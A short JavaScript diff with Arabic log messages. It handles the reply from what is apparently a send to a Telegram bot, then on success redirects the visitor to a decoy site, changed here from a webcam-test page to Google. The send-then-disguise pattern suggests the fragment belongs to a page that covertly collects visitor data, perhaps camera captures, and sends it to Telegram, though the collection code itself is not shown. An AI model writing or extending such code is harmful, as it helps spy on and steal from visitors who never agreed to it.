@@ -21,7 +21,7 @@
         .then(res => res.json())
         .then(data => {
             console.log("رد تيليجرام:", data);
-            if (data.ok) window.location.replace("https://webcamtests.com/");
+            if (data.ok) window.location.replace("https://www.google.com/");
             else console.error("خطأ في الإرسال:", data.description);
         })
         .catch(err => console.error("خطأ في الاتصال:", err));
